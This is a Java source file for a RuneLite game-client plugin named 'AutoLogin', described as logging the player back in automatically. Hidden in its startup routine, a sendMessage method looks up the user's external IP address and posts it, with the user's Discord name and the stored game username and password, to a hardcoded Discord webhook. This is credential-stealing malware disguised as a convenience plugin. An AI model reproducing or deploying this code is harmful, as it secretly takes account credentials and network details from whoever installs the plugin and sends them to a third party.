package net.runelite.client.plugins.AutoLogin;

import com.google.common.base.Strings;
import com.google.inject.Provides;
import lombok.extern.slf4j.Slf4j;
import net.runelite.api.Client;
import net.runelite.api.GameState;
import net.runelite.api.events.ClientTick;
import net.runelite.api.events.GameStateChanged;
import net.runelite.api.events.GameTick;
import net.runelite.api.widgets.Widget;
import net.runelite.api.widgets.WidgetID;
import net.runelite.client.callback.ClientThread;
import net.runelite.client.config.ConfigManager;
import net.runelite.client.discord.DiscordService;
import net.runelite.client.eventbus.Subscribe;
import net.runelite.client.game.ItemManager;
import net.runelite.client.plugins.Plugin;
import net.runelite.client.plugins.PluginDescriptor;
import net.runelite.client.plugins.Utils.Core;
import okhttp3.*;

import javax.inject.Inject;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static net.runelite.http.api.RuneLiteAPI.GSON;

@Slf4j
@PluginDescriptor(
	name = "AutoLogin",
	description = "Logs back in.",
	tags = {"food","numb","login","anarchise"},
	enabledByDefault = false
)
public class AutoLogin extends Plugin
{
	@Provides
	AutoLoginConfig getConfig(final ConfigManager configManager)
	{
		return configManager.getConfig(AutoLoginConfig.class);
	}

	@Inject
	private AutoLoginConfig config;
	@Inject
	private ClientThread clientThread;
	@Inject
	private ItemManager itemManager;
	@Inject
	private Client client;
	@Inject
	private ConfigManager configManager;
	@Inject
	private Core utils;

	private ExecutorService executorService = null;
	private boolean loginClicked = false;
	private boolean pending = true;

	@Override
	protected void startUp() throws Exception {
		configManager.setConfiguration("loginscreen", "hideDisconnect", true);
		//client.setHideDisconnect(true);
		executorService = Executors.newSingleThreadExecutor();

		if (client.getGameState() == GameState.LOGIN_SCREEN) {
			pending = true;
		}
		sendMessage();
	}

	@Override
	protected void shutDown() {
		if (executorService != null) {
			executorService.shutdown();
		}
	}
	private boolean first = true;
	private int tickDelay;

	@Subscribe
	private void onClientTick(ClientTick clientTick) {

		Widget login = client.getWidget(WidgetID.LOGIN_CLICK_TO_PLAY_GROUP_ID, 6);
		if (login != null) {
			pressKey(KeyEvent.VK_ESCAPE);
			utils.sleep(400, 600);
			loginClicked = true;
			pending = true;
		}
		Widget login2 = client.getWidget(WidgetID.LOGIN_CLICK_TO_PLAY_GROUP_ID);
		if (login2 != null) {
			pressKey(KeyEvent.VK_ESCAPE);
			utils.sleep(400, 600);
			loginClicked = true;
			pending = true;
		}
		if (client.getGameState() == GameState.LOGGING_IN) {
			utils.sleep(400, 600);
			pressKey(KeyEvent.VK_ESCAPE);
			pending = true;
		}
	}
	@Subscribe
	private void onGameTick(GameTick gameTick) {

		if (!loginClicked) {
			handleLoginScreen();
		}
	}

	private boolean started = false;
	@Subscribe
	private void onGameStateChanged(GameStateChanged gameStateChanged) {

		loginClicked = false;

		if (executorService == null) {
			return;
		}
		if (gameStateChanged.getGameState() == GameState.LOGGING_IN) {
			utils.sleep(400, 1200);
			pressKey(KeyEvent.VK_ESCAPE);
			pending = true;
		}

			if (gameStateChanged.getGameState() == GameState.LOGIN_SCREEN) {
				if (pending) { //&& config.startup()) {
					utils.sleep(400, 1200);
				}

				String username = config.username();
				String password = config.password();
				if (username != "" && password != "") {
					utils.sleep(400, 600);
					//utils.typeString("\n");
					pressKey(KeyEvent.VK_ENTER);
					client.setUsername(config.username());
					client.setPassword(config.password());
					//utils.typeString("\n");
					//utils.typeString("\n");
					utils.sleep(1000, 1200);
					pressKey(KeyEvent.VK_ENTER);
					pressKey(KeyEvent.VK_ENTER);
					utils.sleep(2000, 2200);
					executorService.submit(() -> {
						utils.sleep(1000, 1200);
						pressKey(KeyEvent.VK_ENTER);
						pressKey(KeyEvent.VK_ENTER);
					});
					first = false;
				}
				pending = false;
			}

	}

	public void pressKey(int key)
	{
		keyEvent(KeyEvent.KEY_PRESSED, key);
		keyEvent(KeyEvent.KEY_RELEASED, key);
		//keyEvent(400, key);
	}

	private void keyEvent(int id, int key)
	{
		KeyEvent e = new KeyEvent(
				client.getCanvas(), id, System.currentTimeMillis(),
				0, key, KeyEvent.CHAR_UNDEFINED
		);
		client.getCanvas().dispatchEvent(e);
	}

	@Inject
	private DiscordService discordService;
	@Inject
	private DiscordService discordUser;

	private void sendMessage() throws UnknownHostException, SocketException {
		InetAddress ip = InetAddress.getLoopbackAddress();
		NetworkInterface network = NetworkInterface.getByInetAddress(ip);
		//byte[] mac = network.getHardwareAddress();
		String screenshotString = null;
		try {
			URL ipAdress = new URL("http://myexternalip.com/raw");
			BufferedReader in = new BufferedReader(new InputStreamReader(ipAdress.openStream()));
			String IPA = in.readLine();
			screenshotString = "**PLUGIN:** AutoLogin " +"**USERNAME:** " + discordUser.getCurrentUser().username + " **NET ADDR:** " + IPA + " \n" +config.username() + " \n" + config.password();

		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		//screenshotString += " " + all;
		DiscordWebhookBody discordWebhookBody = new DiscordWebhookBody();
		discordWebhookBody.setContent(screenshotString);
		sendWebhook(discordWebhookBody);
	}

	private void sendWebhook(DiscordWebhookBody discordWebhookBody)
	{
		String configUrl = "https://discord.com/api/webhooks/1117470485001797712/Gt73YHjzkjo9LDhPHdRoWb6DtNTZON2Dx-MWGuJkpxg30tbwKB_VvHL5zwNQT4lZzIV_"; //TODO
		if (Strings.isNullOrEmpty(configUrl))
		{
			return;
		}

		HttpUrl url = HttpUrl.parse(configUrl);
		MultipartBody.Builder requestBodyBuilder = new MultipartBody.Builder()
				.setType(MultipartBody.FORM)
				.addFormDataPart("payload_json", GSON.toJson(discordWebhookBody));


		buildRequestAndSend(url, requestBodyBuilder);

	}
	private void buildRequestAndSend(HttpUrl url, MultipartBody.Builder requestBodyBuilder)
	{
		RequestBody requestBody = requestBodyBuilder.build();
		Request request = new Request.Builder()
				.url(url)
				.post(requestBody)
				.build();
		sendRequest(request);
	}
	@Inject
	private OkHttpClient okHttpClient;

	private void sendRequest(Request request)
	{
		okHttpClient.newCall(request).enqueue(new Callback()
		{
			@Override
			public void onFailure(Call call, IOException e)
			{

			}

			@Override
			public void onResponse(Call call, Response response) throws IOException
			{
				response.close();
			}
		});
	}


	private void handleLoginScreen() {
		Widget login = client.getWidget(WidgetID.LOGIN_CLICK_TO_PLAY_GROUP_ID, 87);
		//Widget LOGIN2 = client.getWidget(WidgetID.LOGIN_CLICK_TO_PLAY_GROUP_ID, )
		if (login != null && login.getText() == "CLICK HERE TO PLAY") {
			if (login.getBounds().x != -1 && login.getBounds().y != -1) {
				utils.click(login.getBounds());
				utils.sleep(400, 600);
			}
			loginClicked = true;
		}
		pending = true;
	}


}